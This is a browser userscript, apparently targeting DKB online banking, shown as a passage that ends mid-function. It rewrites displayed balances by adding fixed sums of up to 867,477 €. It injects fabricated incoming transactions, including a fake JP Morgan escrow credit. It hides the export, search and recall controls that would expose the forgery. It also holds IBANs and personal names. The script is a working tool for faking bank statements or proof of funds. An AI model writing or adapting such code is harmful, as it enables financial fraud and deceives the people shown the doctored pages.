// ==UserScript==
// @name         Ed DKB Start 4Rec Herbeck-wirtschaftsberatung@web.de
// @namespace    http://tampermonkey.net/
// @version      7.77771
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/546291/Ed%20DKB%20Start%204Rec%20Herbeck-wirtschaftsberatung%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/546291/Ed%20DKB%20Start%204Rec%20Herbeck-wirtschaftsberatung%40webde.meta.js
// ==/UserScript==






// FINSTATUS

  // Index → adjustment mapping (1-based indices)
  const FINSTATBALANCE_CONFIGS = [   /// STARTS WITH 1, NOT 0
    { index: 1, adjustmentAmount: 867477 },
    { index: 2, adjustmentAmount: 77000 },
    { index: 3, adjustmentAmount: 0 },
    { index: 4, adjustmentAmount: 0 },
    { index: 8, adjustmentAmount: 0 },
    { index: 9, adjustmentAmount: 0 },
    { index: 11, adjustmentAmount: 0 },
    // add more as needed...
  ];


// UMSATZE
    const DELTA_AMOUNT = 77000; // Change this to increase or decrease balance
    const IBAN_CHECK = "DE48 1203 0000 1022 2666 52";

// V, H, 7, M, A
  const customTransactions = [

    {
      id: 'custom-tx-5',
      title: 'Dagmar Herbeck-Rosenbaum',
      date: '03.09.25',
      type: 'Eingang',
      amount: '77.000,00 €',
      bucket: 'M', // A        // force month insertion (create 2025-08 if missing)
      insertByDate: true,          // within month place above closest earlier
      steps: -1
    },
 //   {
//      id: 'custom-tx-3',
//      title: 'Investor Group Alpha',
//      date: '15.07.25',
//      type: 'Eingang',
 //     amount: '2.000.000,00 €',
 //     bucket: 'AUTO',              // AUTO: 'Vorgemerkt' -> VORGEMERKT; else insertByDate? then month; else top TODAY
////      insertByDate: true,
 //     steps: 0
//    },
//    {
 //     id: 'custom-tx-4',
//      title: 'Heutiger Bonus',
//      date: '15.08.25',
//      type: 'Eingang',
 //     amount: '1.234,56 €',
 //     bucket: 'TODAY',             // explicitly place under TODAY (create TODAY if missing)
 //     steps: -2                    // move down by 2 items
  //  }
  ];


// POSTFACH

  const RULES = [
    [
      { text: 'Kontoauszug', use: true },
      { text: '8/2025',      use: true },
        { text: 'DE98 1203 0000 1051 0595 23',      use: true },

        // toggle to false if not needed
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '9/2025',      use: true },
        { text: 'DE98 1203 0000 1051 0595 23',      use: false },

        // toggle to false if not needed
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '9/2025',      use: true },
        { text: 'DE98 1203 0000 1051 0595 23',      use: true },

        // toggle to false if not needed
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '10/2025',      use: true },
        { text: 'DE98 1203 0000 1051 0595 23',      use: true },

        // toggle to false if not needed
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '10/2025',      use: true },
        { text: 'DE98 1203 0000 1051 0595 23',      use: false },

        // toggle to false if not needed
    ],
    [
      { text: 'Kontoauszug', use: true },
      { text: '9/2025',      use: true },
        { text: 'DE98 1203 0000 1051 0595 23',      use: true },
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '4/2025',      use: true },
        { text: 'DE98 1203 0000 1051 0595 23',      use: false },
    ],
 [
      { text: 'Kontoauszug', use: true },
      { text: '5/2025',      use: true },
        { text: 'DE98 1203 0000 1051 0595 23',      use: false },
    ],
       [
      { text: 'Kontoauszug', use: true },
      { text: '3/2025',      use: true },
        { text: 'DE98 1203 0000 1051 0595 23',      use: false },
    ],
    // add more sets like this ↓
    // [
    //   { text: 'AnotherWord', use: true },
    //   { text: 'ExtraWord',   use: false },
    // ],
  ];

// SECOND ACCOUNT
// SECOND ACCOUNT
// SECOND ACCOUNT

const secIBAN_CHECK = "DE98 1203 0000 1051 0595 23";

const secDELTA_AMOUNT = 867477;

// SECOND ACCOUNT

  const seccustomTransactions = [
//   {
//      id: 'custom-tx-1',
//      title: 'Treuhand JP Morgan Chase. Freigabe über Absender. A. Gold meldet sich.',
//      date: 'Vorgemerkt',
//      type: 'Treuhand-Eingang',
//      amount: '477.977,34 €',
//      bucket: 'VORGEMERKT',
//      steps: 0
//    },
//    {
//      id: 'custom-tx-2',
//      title: 'Miete Berlin Office',
//      date: '01.08.25',
//      type: 'Ausgang',
//      amount: '-2.500,00 €',
//      bucket: 'AUTO',             // force month insertion (create 2025-08 if missing)
//      insertByDate: true,          // within month place above closest earlier
//      steps: 0
//    },
     {
      id: 'custom-tx-6',
      title: 'Treuhand JP Morgan Chase. Freigabe über Absender. A. Gold meldet sich.',
      date: '10.09.25',
      type: 'Treuhand-Eingang',
      amount: '772.977,17 €',
      bucket: 'M',
      insertByDate: true,
      steps: -1
    },
 {
      id: 'custom-tx-7',
      title: 'Dagmar Herbeck-Rosenbaum',
      date: '07.11.25',
      type: 'Eingang',
      amount: '9.500,00 €',
      bucket: 'M',             // force month insertion (create 2025-08 if missing)
      insertByDate: true,          // within month place above closest earlier
      steps: -1
    },
      {
      id: 'custom-tx-5',
      title: 'Dagmar Herbeck-Rosenbaum',
      date: '10.09.25',
      type: 'Eingang',
      amount: '85.000,00 €',
      bucket: 'M',             // force month insertion (create 2025-08 if missing)
      insertByDate: true,          // within month place above closest earlier
      steps: -1
    },
//    {
//      id: 'custom-tx-4',
//      title: 'Heutiger Bonus',
//      date: '15.08.25',
//      type: 'Eingang',
//      amount: '1.234,56 €',
//      bucket: 'TODAY',             // explicitly place under TODAY (create TODAY if missing)
//      steps: -2                    // move down by 2 items
//    }
  ];

// SECOND ACCOUNT END
// SECOND ACCOUNT END



// UTILITIES
    // === TOGGLE FLAGS ===
    const shouldRemoveAriaLabel = true;
    const shouldRemoveAmountFeedback = true;
    const shouldRemoveRecallTransferParent = true;
    const shouldRemoveSearchTransactionsParent = true;
    const shouldRemoveZeitraum = true;
    const shouldRemoveTrafficPill = true;
    const shouldRemovePdf = true;
    const shouldRemoveCsv = true;
    const shouldRemoveExportHeader = true;
    const shouldDisableClicksOnUmsaetzeFuer = true;
    const shouldRemoveMoneyTransferIcon = true;
    const shouldRemoveCreditingIcon = true;
    const shouldRemoveStyledTypography = true;
    const shouldRemoveTagesgeldAriaLabel = true;
    const shouldRemoveObservableContainer = true;
    const shouldRemoveCustomizeOverviewButton = true; // ✅ NEW

//======================================================================================
//======================================================================================
//======================================================================================

// FINSTATUS
// FINSTATUS
// FINSTATUS




 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

//  // Index → adjustment mapping (1-based indices)
 // const FINSTATBALANCE_CONFIGS = [
//    { index: 1, adjustmentAmount: 2164.75 },
////    { index: 2, adjustmentAmount: 2164.75 },
//    { index: 3, adjustmentAmount: 14000 },
//    { index: 4, adjustmentAmount: 0 },
//    { index: 8, adjustmentAmount: 0 },
//    { index: 9, adjustmentAmount: 0 },
//    { index: 11, adjustmentAmount: 0 },
//    // add more as needed...
//  ];

  const STABLE_CLASS_PART = '_sui-list-item__right-section__content__value';
  const INTERVAL_MS = 100;

  const stateMap = new Map(); // key: index, value: { originalValue, modifiedText }

  const parseGermanNumber = (str) => {
    try {
      return parseFloat(str.replace(/\./g, '').replace(',', '.'));
    } catch (e) {
      console.error('Parsing failed:', str, e);
      return NaN;
    }
  };

  const formatGermanNumber = (num) => {
    return num.toLocaleString('de-DE', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    });
  };

  const findAllBalanceElements = () => {
    const candidates = Array.from(document.querySelectorAll('p'));
    return candidates.filter(p => p.className && typeof p.className === 'string' && p.className.includes(STABLE_CLASS_PART));
  };

  const updateAllBalances = () => {
    const elements = findAllBalanceElements();

    if (!elements.length) {
      console.debug('No balance elements found yet...');
      return;
    }

    for (const config of FINSTATBALANCE_CONFIGS) {
      const i = config.index - 1; // Convert to 0-based
      const delta = config.adjustmentAmount;

      if (!elements[i]) {
        console.debug(`Element for index ${config.index} not found.`);
        continue;
      }

      const el = elements[i];
      const rawText = el.innerText?.trim().replace(/\s/g, '').replace('€', '');
      if (!rawText) continue;

      const parsed = parseGermanNumber(rawText);
      if (isNaN(parsed)) {
        console.warn(`Invalid number format at index ${config.index}:`, rawText);
        continue;
      }

      // Cache original balance if not already
      if (!stateMap.has(config.index)) {
        const modifiedText = formatGermanNumber(parsed + delta) + ' €';
        stateMap.set(config.index, {
          originalValue: parsed,
          modifiedText
        });
        console.log(`Cached original balance at index ${config.index}:`, parsed);
      }

      const { originalValue, modifiedText } = stateMap.get(config.index);

      if (Math.abs(parsed - originalValue) < 0.01) {
        el.innerText = modifiedText;
        console.log(`Balance at index ${config.index} modified to:`, modifiedText);
      } else if (el.innerText === modifiedText) {
        console.debug(`Balance at index ${config.index} already modified.`);
      } else {
        console.log(`Balance at index ${config.index} changed externally or unknown state.`);
      }
    }
  };

  // Start interval loop
  setInterval(updateAllBalances, INTERVAL_MS);
}

//======================================================================================
//======================================================================================
//======================================================================================


//======================================================================================
//======================================================================================
//======================================================================================

// UMSATZE BALANCE
// UMSATZE BALANCE
// UMSATZE BALANCE



 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

    'use strict';

 //   const DELTA_AMOUNT = 100.25; // Change this to increase or decrease balance
    const INTERVAL_MS = 100;
    const SELECTOR = 'h1[class^="_sui-header__left-section__title"]';
//    const IBAN_CHECK = "DE56 1203 0000 1078 9438 99";

    let originalAmount = null;
    let lastModifiedTime = 0;

    const forbiddenWords = [
        'finanzstatus',
        'überweisung',
        'karten',
        'aufträge',
        'produkte',
        'kontodetails',
        'postfach',
        'einstellungen',
        'mein profil'
    ];

    function parseGermanNumber(text) {
        const cleaned = text.replace(/\./g, '').replace(',', '.').replace(/[^\d.-]/g, '');
        const parsed = parseFloat(cleaned);
        return isNaN(parsed) ? null : parsed;
    }

    function formatGermanNumber(num) {
        return num.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' });
    }

    function extractDigits(str) {
        return str.replace(/\D/g, '');
    }

    function isIBANMatch() {
        const expectedDigits = extractDigits(IBAN_CHECK);
        const elements = document.querySelectorAll('[aria-label]');
        for (const el of elements) {
            const ariaValue = el.getAttribute('aria-label') || '';
            const ariaDigits = extractDigits(ariaValue);
            if (ariaDigits.includes(expectedDigits)) {
                console.log('✅ IBAN match found:', ariaValue);
                return true;
            }
        }
        console.warn('❌ No IBAN match found.');
        return false;
    }

    function isBalanceElementValid(text) {
        const normalized = text.toLowerCase();

        // Must contain at least one digit
        if (!/\d/.test(normalized)) {
            console.warn('⚠️ Balance element contains no digits.');
            return false;
        }

        for (const word of forbiddenWords) {
            if (normalized.includes(word)) {
                console.warn(`⚠️ Balance element contains forbidden word: "${word}"`);
                return false;
            }
        }

        return true;
    }

    function tryUpdateBalance() {
        const balanceElem = document.querySelector(SELECTOR);
        if (!balanceElem) {
            console.log('Balance element not found yet.');
            return;
        }

        const currentText = balanceElem.textContent.trim();

        if (!isBalanceElementValid(currentText)) {
            return;
        }

        if (!isIBANMatch()) {
            return;
        }

        if (originalAmount === null) {
            const parsed = parseGermanNumber(currentText);
            if (parsed === null) {
                console.warn('Failed to parse original balance:', currentText);
                return;
            }
            originalAmount = parsed;
            console.log('Original balance cached:', originalAmount);
        }

        const now = Date.now();
        if (now - lastModifiedTime >= INTERVAL_MS) {
            const newAmount = originalAmount + DELTA_AMOUNT;
            const formatted = formatGermanNumber(newAmount);
            balanceElem.textContent = formatted;
            console.log(`Balance updated to: ${formatted}`);
            lastModifiedTime = now;
        }
    }

    setInterval(tryUpdateBalance, INTERVAL_MS);
  }

//======================================================================================
//======================================================================================
//======================================================================================



//======================================================================================
//======================================================================================
//======================================================================================

// UMSATZE TRANSAKTIONEN
// UMSATZE TRANSAKTIONEN
// UMSATZE TRANSAKTIONEN



if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

  const TICK = 100;
//  const IBAN_CHECK = "DE98 1203 0000 1051 0595 23";

  // Special buckets
  const PENDING_KEY = 'VORGEMERKT';
  const PENDING_TITLE = 'Vorgemerkt';
  const TODAY_KEY = 'TODAY';
  const TODAY_TITLE = 'Heute';
  const LAST7_KEY = 'LAST7';
  const LAST7_TITLE = 'Letzte 7 Tage';
  const YESTERDAY_KEY = 'YESTERDAY';
  const YESTERDAY_TITLE = 'Gestern';

  // How to control placement per transaction:
  // - bucket: 'AUTO' (default), 'TODAY', 'VORGEMERKT', 'MONTH'
  // - insertByDate: (used only by AUTO and MONTH) true => insert inside correct month by date; false => top of TODAY
  // - steps: positive => move UP N positions from default; negative => move DOWN |N| positions
//  const customTransactions = [
//   {
//      id: 'custom-tx-1',
//      title: 'Treuhand JP Morgan Chase. Freigabe über Absender. A. Gold meldet sich.',
//      date: 'Vorgemerkt',
//      type: 'Treuhand-Eingang',
//      amount: '477.977,34 €',
//      bucket: 'VORGEMERKT',
//      steps: 0
//    },
//    {
//      id: 'custom-tx-2',
//      title: 'Miete Berlin Office',
//      date: '01.08.25',
//      type: 'Ausgang',
//      amount: '-2.500,00 €',
//      bucket: 'AUTO',             // force month insertion (create 2025-08 if missing)
//      insertByDate: true,          // within month place above closest earlier
//      steps: 0
//    },
//    {
//      id: 'custom-tx-3',
//      title: 'Dagmar Herbeck-Rosenbaum',
//      date: '04.09.25',
//      type: 'Eingang',
//      amount: '85.000,00 €',
//      bucket: 'G',              // AUTO: 'Vorgemerkt' -> VORGEMERKT; else insertByDate? then month; else top TODAY
//      insertByDate: true,
//      steps: 2
//    },
//    {
//      id: 'custom-tx-4',
//      title: 'Heutiger Bonus',
//      date: '15.08.25',
//      type: 'Eingang',
//      amount: '1.234,56 €',
//      bucket: 'TODAY',             // explicitly place under TODAY (create TODAY if missing)
//      steps: -2                    // move down by 2 items
//    }
//  ];

  // ---------- helpers ----------
  const digits = s => (s || '').replace(/\D/g, '');
  const isPositiveAmount = s => !s.trim().startsWith('-');
  const hasEl = id => document.getElementById(id) !== null;
  const clamp = (n, min, max) => Math.max(min, Math.min(max, n));
  const isVorgemerkt = s => !!s && /vorgemerkt/i.test(s);

  const MONTHS_DE = ['Januar','Februar','März','April','Mai','Juni','Juli','August','September','Oktober','November','Dezember'];

  let incomingClassTokenCache = null;
  function getIncomingClassToken(root) {
    if (incomingClassTokenCache) return incomingClassTokenCache;
    const p = root.querySelector('p[class*="__amount--incoming"]');
    if (p) {
      for (const cls of p.classList) {
        if (cls.includes('amount--incoming')) {
          incomingClassTokenCache = cls;
          return incomingClassTokenCache;
        }
      }
    }
    // fallback token seen in samples
    incomingClassTokenCache = '_sui-list-item__right-section__content__amount--incoming_11uji_574';
    return incomingClassTokenCache;
  }

  function parseDateFromText(text) {
    if (!text || /vorgemerkt/i.test(text)) return null;
    const m = text.match(/(\d{2})\.(\d{2})\.(\d{2,4})/);
    if (!m) return null;
    let [ , dd, mm, yy] = m;
    yy = yy.length === 2 ? ('20' + yy) : yy;
    return new Date(Number(yy), Number(mm) - 1, Number(dd));
  }

  function monthKeyFromDateStr(dateStr) {
    const d = parseDateFromText(dateStr);
    if (!d) return null;
    const y = d.getFullYear();
    const m = String(d.getMonth() + 1).padStart(2, '0');
    return `${y}-${m}`;
  }

  function monthLabelFromKey(monthKey) {
    const m = monthKey.match(/^(\d{4})-(\d{2})$/);
    if (!m) return monthKey;
    const y = Number(m[1]);
    const idx = Number(m[2]) - 1;
    const name = MONTHS_DE[idx] || m[2];
    return `${name} ${y}`;
  }

  function findRootSectionForIban() {
    const want = digits(IBAN_CHECK);
    const labels = document.querySelectorAll('[aria-label]');
    for (const el of labels) {
      const al = el.getAttribute('aria-label');
      if (digits(al).includes(want)) {
        return el.closest('section');
      }
    }
    return null;
  }

  function getControlsSection(rootSection) {
    return rootSection.querySelector('section.sc-gGyJSQ');
  }

  function findTodayArticleUl(rootSection) {
    const article = rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"]`);
    return article ? article.querySelector('ul[class^="_sui-card"]') : null;
  }

  function findYesterdayArticleUl(rootSection) {
    const article = rootSection.querySelector(`article[aria-labelledby="${YESTERDAY_KEY}"]`);
    return article ? article.querySelector('ul[class^="_sui-card"]') : null;
  }

  function ensureYesterdayArticleUl(rootSection) {
    let ul = findYesterdayArticleUl(rootSection);
    if (ul) return ul;

    const templateArticle = getAnyArticleTemplate(rootSection);
    if (!templateArticle) {
      console.log('[UserScript] Template article not ready; will retry creating YESTERDAY');
      return null;
    }

    try {
      const newArticle = templateArticle.cloneNode(true);
      newArticle.setAttribute('aria-labelledby', YESTERDAY_KEY);
      newArticle.setAttribute('data-tm-placeholder', '1');

      const header = newArticle.querySelector('header[id]');
      if (header) header.id = YESTERDAY_KEY;

      const h2 = newArticle.querySelector('h2');
      if (h2) h2.textContent = YESTERDAY_TITLE;

      let ulNode = newArticle.querySelector('ul[class^="_sui-card"]');
      if (!ulNode) {
        const ulTmpl = rootSection.querySelector('ul[class^="_sui-card"]');
        ulNode = document.createElement('ul');
        ulNode.className = ulTmpl ? ulTmpl.className : '_sui-card';
        newArticle.appendChild(ulNode);
      } else {
        while (ulNode.firstChild) ulNode.removeChild(ulNode.firstChild);
      }

      const today = rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"]`);
      const vorgemerkt = rootSection.querySelector(`article[aria-labelledby="${PENDING_KEY}"]`);
      const controls = getControlsSection(rootSection);
      const after = today || vorgemerkt || controls;


      if (after) {
        if (after.nextSibling) rootSection.insertBefore(newArticle, after.nextSibling);
        else rootSection.appendChild(newArticle);
      } else {
        rootSection.insertBefore(newArticle, rootSection.firstElementChild);
      }

      console.log('[UserScript] Created placeholder YESTERDAY ("Gestern")');
      return ulNode;
    } catch (e) {
      console.error('[UserScript] Failed to create YESTERDAY article', e);
      return null;
    }
  }


      function getAnchorAfterControls(rootSection) {
    const today = rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"]`);
    const controls = getControlsSection(rootSection);
    return today || controls || null;
  }

  function monthArticlesAfterAnchor(rootSection, anchor) {
    const out = [];
    let n = anchor ? anchor.nextElementSibling : rootSection.firstElementChild;
    while (n) {
      if (n.matches && n.matches('article[aria-labelledby^="20"]')) out.push(n);
      n = n.nextElementSibling;
    }
    return out;
  }

  function findMonthArticleUl(rootSection, monthKey) {
    if (!monthKey) return null;
    const article = rootSection.querySelector(`article[aria-labelledby="${monthKey}"]`);
    if (!article) return null;
    return article.querySelector('ul[class^="_sui-card"]');
  }

  function findPendingArticleUl(rootSection) {
    const article = rootSection.querySelector(`article[aria-labelledby="${PENDING_KEY}"]`);
    return article ? article.querySelector('ul[class^="_sui-card"]') : null;
  }

  function findLast7ArticleUl(rootSection) {
    const candidates = Array.from(rootSection.querySelectorAll(`article[aria-labelledby="${LAST7_KEY}"], article[aria-labelledby="LAST_WEEK"]`));
    if (candidates.length === 0) return null;
    const real = candidates.find(a => !a.hasAttribute('data-tm-placeholder')) || candidates[0];
    return real.querySelector('ul[class^="_sui-card"]') || null;
  }

  function insertPendingArticleAtTop(rootSection, newArticle) {
    // VORGEMERKT should be right below controls and before TODAY
    const controls = getControlsSection(rootSection);
    if (controls) {
      if (controls.nextSibling) rootSection.insertBefore(newArticle, controls.nextSibling);
      else rootSection.appendChild(newArticle);
      return;
    }
    const first = rootSection.firstElementChild;
    if (first) rootSection.insertBefore(newArticle, first);
    else rootSection.appendChild(newArticle);
  }

  function insertTodayArticleInOrder(rootSection, newArticle) {
    // TODAY should be below VORGEMERKT (if present) and above months
    const controls = getControlsSection(rootSection);
    const vorgemerkt = rootSection.querySelector(`article[aria-labelledby="${PENDING_KEY}"]`);
    const after = vorgemerkt || controls || null;
    if (after) {
      if (after.nextSibling) rootSection.insertBefore(newArticle, after.nextSibling);
      else rootSection.appendChild(newArticle);
    } else {
      const first = rootSection.firstElementChild;
      if (first) rootSection.insertBefore(newArticle, first);
      else rootSection.appendChild(newArticle);
    }
  }

  function insertLast7ArticleInOrder(rootSection, newArticle) {
    const today = rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"]`);
    const yesterday = rootSection.querySelector(`article[aria-labelledby="${YESTERDAY_KEY}"]`);
    const vorgemerkt = rootSection.querySelector(`article[aria-labelledby="${PENDING_KEY}"]`);
    const controls = getControlsSection(rootSection);
    const after = yesterday || today || vorgemerkt || controls || null;

    if (after) {
      if (after.nextSibling) rootSection.insertBefore(newArticle, after.nextSibling);
      else rootSection.appendChild(newArticle);
    } else {
      const first = rootSection.firstElementChild;
      if (first) rootSection.insertBefore(newArticle, first);
      else rootSection.appendChild(newArticle);
    }
  }

  function insertMonthArticleInOrder(rootSection, newArticle, monthKey) {
    const anchor = getAnchorAfterControls(rootSection);
    const months = monthArticlesAfterAnchor(rootSection, anchor);
    // keep DESC by key: insert before the first older (k < newKey)
    for (const m of months) {
      const k = m.getAttribute('aria-labelledby');
      if (k < monthKey) {
        rootSection.insertBefore(newArticle, m);
        return;
      }
    }
    if (months.length > 0) {
      const last = months[months.length - 1];
      if (last.nextSibling) rootSection.insertBefore(newArticle, last.nextSibling);
      else rootSection.appendChild(newArticle);
    } else if (anchor) {
      if (anchor.nextSibling) rootSection.insertBefore(newArticle, anchor.nextSibling);
      else rootSection.appendChild(newArticle);
    } else {
      rootSection.appendChild(newArticle);
    }
  }

  function getItemDate(li) {
    const subtitle = li.querySelector('span[class*="__subtitle"]');
    return parseDateFromText(subtitle ? subtitle.textContent : '');
  }

  function findInsertionPointByDate(ul, txDateStr) {
    const txDate = parseDateFromText(txDateStr);
    if (!txDate) return null;
    const items = getListItems(ul);
    for (const item of items) {
      const d = getItemDate(item);
      if (!d) continue;
      if (d < txDate) return item; // insert BEFORE the closest earlier item
    }
    return null; // append at end
  }

  function isSkeletonLi(li) {
    return !!li.querySelector('[class*="_sui-skeleton"]');
  }

  function getValidItemsWithAmount(rootSection) {
    return Array.from(rootSection.querySelectorAll('li[class^="_sui-list-item"]'))
      .filter(li => !isSkeletonLi(li) && li.querySelector('p[class*="__amount"]'));
  }

  function findTemplateToClone(rootSection, preferPositive) {
    const items = getValidItemsWithAmount(rootSection);
    const pick = wantPos => items.find(li => {
      const p = li.querySelector('p[class*="__amount"]');
      return p && (isPositiveAmount(p.textContent.trim()) === wantPos);
    });
    return pick(preferPositive) || pick(!preferPositive) || items[0] || null;
  }

  function updateCloneContent(clone, tx, rootSection) {
    const titleEl = clone.querySelector('span[class*="__title"]');
    const subtitleEl = clone.querySelector('span[class*="__subtitle"]');
    const amountEl = clone.querySelector('p[class*="__amount"]');

    if (titleEl) titleEl.textContent = tx.title;
    if (subtitleEl) subtitleEl.textContent = `${tx.date} • ${tx.type}`;

    if (amountEl) {
      amountEl.textContent = tx.amount;
      const incomingToken = getIncomingClassToken(rootSection);
      const cleaned = Array.from(amountEl.classList).filter(
        cls => !cls.includes('amount--incoming') && cls !== 'undefined'
      );
      amountEl.className = cleaned.join(' ').trim();
      if (isPositiveAmount(tx.amount)) {
        amountEl.classList.add(incomingToken);
      } else {
        amountEl.classList.add('undefined');
      }
    }

    clone.dataset.tmSteps = String(Number(tx.steps || 0));
  }


      function getAnyArticleTemplate(rootSection) {
    // Prefer TODAY as visual template; else any month article
    return rootSection.querySelector(`article[aria-labelledby="${TODAY_KEY}"]`) ||
           rootSection.querySelector('article[aria-labelledby^="20"]') ||
           null;
  }

  function ensureMonthArticleUl(rootSection, monthKey) {
    let ul = findMonthArticleUl(rootSection, monthKey);
    if (ul) return ul;

    const templateArticle = getAnyArticleTemplate(rootSection);
    if (!templateArticle) {
      console.log(`[UserScript] Template article not ready; will retry creating ${monthKey}`);
      return null;
    }

    try {
      const newArticle = templateArticle.cloneNode(true);
      newArticle.setAttribute('aria-labelledby', monthKey);
      newArticle.setAttribute('data-tm-placeholder', '1');

      const header = newArticle.querySelector('header[id]');
      if (header) header.id = monthKey;

      const h2 = newArticle.querySelector('h2');
      if (h2) h2.textContent = monthLabelFromKey(monthKey);

      let ulNode = newArticle.querySelector('ul[class^="_sui-card"]');
      if (!ulNode) {
        const ulTmpl = rootSection.querySelector('ul[class^="_sui-card"]');
        ulNode = document.createElement('ul');
        ulNode.className = ulTmpl ? ulTmpl.className : '_sui-card';
        newArticle.appendChild(ulNode);
      } else {
        while (ulNode.firstChild) ulNode.removeChild(ulNode.firstChild);
      }

      insertMonthArticleInOrder(rootSection, newArticle, monthKey);
      console.log(`[UserScript] Created placeholder month article ${monthKey}`);
      return ulNode;
    } catch (e) {
      console.error('[UserScript] Failed to create month article', monthKey, e);
      return null;
    }
  }

  function ensurePendingArticleUl(rootSection) {
    let ul = findPendingArticleUl(rootSection);
    if (ul) return ul;

    const templateArticle = getAnyArticleTemplate(rootSection);
    if (!templateArticle) {
      console.log('[UserScript] Template article not ready; will retry creating VORGEMERKT');
      return null;
    }

    try {
      const newArticle = templateArticle.cloneNode(true);
      newArticle.setAttribute('aria-labelledby', PENDING_KEY);
      newArticle.setAttribute('data-tm-placeholder', '1');

      const header = newArticle.querySelector('header[id]');
      if (header) header.id = PENDING_KEY;

      const h2 = newArticle.querySelector('h2');
      if (h2) h2.textContent = PENDING_TITLE;

      let ulNode = newArticle.querySelector('ul[class^="_sui-card"]');
      if (!ulNode) {
        const ulTmpl = rootSection.querySelector('ul[class^="_sui-card"]');
        ulNode = document.createElement('ul');
        ulNode.className = ulTmpl ? ulTmpl.className : '_sui-card';
        newArticle.appendChild(ulNode);
      } else {
        while (ulNode.firstChild) ulNode.removeChild(ulNode.firstChild);
      }

      insertPendingArticleAtTop(rootSection, newArticle);
      console.log('[UserScript] Created placeholder VORGEMERKT (top)');
      return ulNode;
    } catch (e) {
      console.error('[UserScript] Failed to create VORGEMERKT article', e);
      return null;
    }
  }

  function ensureTodayArticleUl(rootSection) {
    let ul = findTodayArticleUl(rootSection);
    if (ul) return ul;

    const templateArticle = getAnyArticleTemplate(rootSection);
    if (!templateArticle) {
      console.log('[UserScript] Template article not ready; will retry creating TODAY');
      return null;
    }

    try {
      const newArticle = templateArticle.cloneNode(true);
      newArticle.setAttribute('aria-labelledby', TODAY_KEY);
      newArticle.setAttribute('data-tm-placeholder', '1');

      const header = newArticle.querySelector('header[id]');
      if (header) header.id = TODAY_KEY;

      const h2 = newArticle.querySelector('h2');
      if (h2) h2.textContent = TODAY_TITLE;

      let ulNode = newArticle.querySelector('ul[class^="_sui-card"]');
      if (!ulNode) {
        const ulTmpl = rootSection.querySelector('ul[class^="_sui-card"]');
        ulNode = document.createElement('ul');
        ulNode.className = ulTmpl ? ulTmpl.className : '_sui-card';
        newArticle.appendChild(ulNode);
      } else {
        while (ulNode.firstChild) ulNode.removeChild(ulNode.firstChild);
      }

      insertTodayArticleInOrder(rootSection, newArticle);
      console.log('[UserScript] Created placeholder TODAY ("Heute")');
      return ulNode;
    } catch (e) {
      console.error('[UserScript] Failed to create TODAY article', e);
      return null;
    }
  }

  function ensureLast7ArticleUl(rootSection) {
    // If the real "Letzte 7 Tage" exists (LAST7 or LAST_WEEK), use it; don't create a new one.
    let ul = findLast7ArticleUl(rootSection);
    if (ul) return ul;

    const templateArticle = getAnyArticleTemplate(rootSection);
    if (!templateArticle) {
      console.log('[UserScript] Template article not ready; will retry creating LAST7');
      return null;
    }

    try {
      const newArticle = templateArticle.cloneNode(true);
      newArticle.setAttribute('aria-labelledby', LAST7_KEY);
      newArticle.setAttribute('data-tm-placeholder', '1');

      const header = newArticle.querySelector('header[id]');
      if (header) header.id = LAST7_KEY;

      const h2 = newArticle.querySelector('h2');
      if (h2) h2.textContent = LAST7_TITLE;

      let ulNode = newArticle.querySelector('ul[class^="_sui-card"]');
      if (!ulNode) {
        const ulTmpl = rootSection.querySelector('ul[class^="_sui-card"]');
        ulNode = document.createElement('ul');
        ulNode.className = ulTmpl ? ulTmpl.className : '_sui-card';
        newArticle.appendChild(ulNode);
      } else {
        while (ulNode.firstChild) ulNode.removeChild(ulNode.firstChild);
      }

      insertLast7ArticleInOrder(rootSection, newArticle);
      console.log('[UserScript] Created placeholder LAST7 ("Letzte 7 Tage")');
      return ulNode;
    } catch (e) {
      console.error('[UserScript] Failed to create LAST7 article', e);
      return null;
    }
  }

  function getListItems(ul) {
    return Array.from(ul.children).filter(el => el.tagName === 'LI' && el.className.startsWith('_sui-list-item'));
  }

  function insertWithSteps(ul, li, defaultBeforeEl, defaultIndexOverride, steps) {
    const items = getListItems(ul);
    let defaultIndex;
    if (typeof defaultIndexOverride === 'number') {
      defaultIndex = defaultIndexOverride; // e.g., 0 for top insertion
    } else {
      defaultIndex = defaultBeforeEl ? items.indexOf(defaultBeforeEl) : items.length;
      if (defaultIndex < 0) defaultIndex = items.length;
    }
    // Positive steps => move UP (lower index), negative => move DOWN
    const targetIndex = clamp(defaultIndex - (Number(steps) || 0), 0, items.length);
    const anchor = items[targetIndex] || null;
    if (anchor) ul.insertBefore(li, anchor); else ul.appendChild(li);
  }

  // helper: get date range (min/max) from a UL list (used for LAST7 AUTO logic)
  function getUlDateRange(ul) {
    const items = getListItems(ul);
    let minD = null, maxD = null;
    for (const item of items) {
      const d = getItemDate(item);
      if (!d) continue;
      if (!minD || d < minD) minD = d;
      if (!maxD || d > maxD) maxD = d;
    }
    if (!minD || !maxD) return null;
